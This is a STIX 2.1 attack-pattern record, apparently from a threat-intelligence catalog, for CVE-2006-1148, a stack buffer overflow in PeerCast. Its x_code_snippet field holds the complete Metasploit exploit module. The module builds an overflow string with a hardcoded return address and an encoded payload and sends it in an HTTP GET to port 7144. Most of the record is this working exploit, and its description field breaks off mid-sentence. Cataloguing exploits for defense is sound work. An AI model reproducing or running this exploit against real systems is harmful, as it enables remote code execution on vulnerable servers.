{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e81f6e7a-f847-4a6e-b8f7-f2a975fb3fab",
    "created": "2024-08-14T17:02:10.854447Z",
    "modified": "2024-08-14T17:02:10.854451Z",
    "name": "PeerCast URL Handling Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in PeerCast <= v0.1216. The vulnerability is caused due to a boundary error within the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/peercast_url.rb",
            "external_id": "peercast_url.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1148"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PeerCast URL Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in PeerCast <= v0.1216.\n        The vulnerability is caused due to a boundary error within the\n        handling of URL parameters.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-1148'],\n          ['OSVDB', '23777'],\n          ['BID', '17040']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 200,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x0d\\x2f\\x3d\\x3b\",\n          'MinNops'  => 64,\n        },\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['PeerCast v0.1212 Binary', { 'Ret' => 0x080922f7 }],\n        ],\n      'DisclosureDate' => '2006-03-08'))\n\n    register_options([\n      Opt::RPORT(7144)\n    ])\n  end\n\n  def exploit\n    connect\n\n    pat = rand_text_alphanumeric(780)\n    pat << [target.ret].pack('V')\n    pat << payload.encoded\n\n    uri = '/stream/?' + pat\n\n    res = \"GET #{uri} HTTP/1.0\\r\\n\\r\\n\"\n\n    print_status(\"Trying target address 0x%.8x...\" % target.ret)\n    sock.put(res)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        "[ MC ]",
        ""
    ],
    "x_mitre_disclosure_date": "2006-03-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}